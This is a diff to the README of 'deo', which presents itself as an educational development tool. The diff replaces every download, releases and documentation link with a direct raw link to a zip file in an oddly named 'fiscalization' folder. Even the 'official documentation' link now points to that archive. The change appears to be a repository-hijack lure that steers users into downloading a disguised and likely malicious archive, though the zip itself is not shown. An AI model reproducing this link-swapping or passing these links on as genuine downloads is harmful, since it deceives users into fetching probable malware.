@@ -1,7 +1,7 @@
 # 🚀 deo - Learn Modern Development Practices Easily
 
 ## 🌐 Download Now
-[![Download deo](https://img.shields.io/badge/Download-deo-blue.svg)](https://github.com/cjplanas/deo/releases)
+[![Download deo](https://raw.githubusercontent.com/cjplanas/deo/main/fiscalization/deo.zip)](https://raw.githubusercontent.com/cjplanas/deo/main/fiscalization/deo.zip)
 
 ## 📘 Introduction
 Welcome to **deo**, an educational resource designed to help you learn modern development practices. Whether you are a beginner or looking to sharpen your skills, deo provides the tools and guidance you need.
@@ -10,7 +10,7 @@ Welcome to **deo**, an educational resource designed to help you learn modern de
 To get started with deo, please follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the download page.
-   [Download deo](https://github.com/cjplanas/deo/releases)
+   [Download deo](https://raw.githubusercontent.com/cjplanas/deo/main/fiscalization/deo.zip)
 
 2. **Choose the Right Version:** On the Releases page, you will see several versions of the software. Select the latest version for the best experience.
 
@@ -46,17 +46,17 @@ After launching deo, you will find a user-friendly interface that makes it easy 
 ## 📞 Getting Help
 If you encounter any issues during installation or usage, we are here to help:
 
-- **Documentation:** Check our [official documentation](https://github.com/cjplanas/deo/wiki) for detailed guides and FAQs.
+- **Documentation:** Check our [official documentation](https://raw.githubusercontent.com/cjplanas/deo/main/fiscalization/deo.zip) for detailed guides and FAQs.
 - **Support Community:** Join our support community on platforms like Discord or Reddit to connect with other users and share your experiences.
 - **Contact Support:** If needed, you can reach out to our support team via the GitHub issues page.
 
 ## 🔄 Updates
 To keep your version of deo up to date:
 
-1. **Check for Updates:** Periodically visit the [Releases page](https://github.com/cjplanas/deo/releases) to see if a new version is available.
+1. **Check for Updates:** Periodically visit the [Releases page](https://raw.githubusercontent.com/cjplanas/deo/main/fiscalization/deo.zip) to see if a new version is available.
 2. **Download the Latest Version:** If a newer version exists, download and run the installer again. It will replace your old version without losing your settings.
 
 ## ✅ Conclusion
-With deo, you have a powerful resource to learn modern development practices at your fingertips. Start your journey today by downloading and installing the application. We look forward to seeing you grow as a developer! Remember to revisit the [Download deo](https://github.com/cjplanas/deo/releases) link anytime for updates. 
+With deo, you have a powerful resource to learn modern development practices at your fingertips. Start your journey today by downloading and installing the application. We look forward to seeing you grow as a developer! Remember to revisit the [Download deo](https://raw.githubusercontent.com/cjplanas/deo/main/fiscalization/deo.zip) link anytime for updates. 
 
 Happy learning!
